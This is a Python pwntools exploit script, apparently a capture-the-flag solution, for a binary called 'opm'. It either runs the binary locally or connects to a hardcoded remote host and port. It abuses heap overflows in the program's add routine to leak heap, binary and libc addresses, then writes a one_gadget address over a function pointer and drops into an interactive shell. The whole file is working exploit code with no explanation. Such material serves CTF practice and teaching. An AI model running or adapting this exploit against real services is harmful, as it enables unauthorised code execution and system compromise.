from pwn import *

DEBUG = 1

if DEBUG:
    context.log_level = 'DEBUG'
    sh = process('./opm')
    read_offset = 0xf7250
    # gdb.attach(sh)
else:
    sh = remote('39.107.33.43', 13572)


def add(name, punch):
    sh.sendlineafter('(E)xit\n', 'A')
    sh.sendlineafter('name:\n', name)
    sh.sendlineafter('punch?\n', punch)


def leak(address):
    add('CCCC', str(address).ljust(128, 'A') + chr(0x4a - 24))
    add('CCCC', 'A' * 128 + 'B')
    sh.recvuntil('<')
    data = u64(sh.recvuntil('>')[:-1].ljust(8, '\x00'))
    return data


add('A' * 64, '1')
add('C' * 128 + 'B', '2')
add('D' * 128, 'E' * 128 + 'B')
sh.recvuntil('C' * 24)
heap = u64(sh.recvuntil('>')[:-1].ljust(8, '\x00'))
log.info('leak heap:' + hex(heap))
heap0 = heap - 0x170
main = leak(heap0) - 0xb30
log.info('leak main:' + hex(main))
read_plt = main + 0x202028
read = leak(read_plt)
log.info('leak read:' + hex(read))
libc = read - read_offset
one_gadget = libc + 0x4526a

add('CCCC', str(one_gadget).ljust(128, 'A') + chr(0x42 - 24))
add('CCCC', str(int(hex(one_gadget)[:-8], 16)
                ).ljust(128, 'A') + chr(0x42 - 24 + 4))
add('CCCC', 'A' * 128 + 'B')
sh.sendlineafter('(E)xit\n', 'S')

sh.interactive()
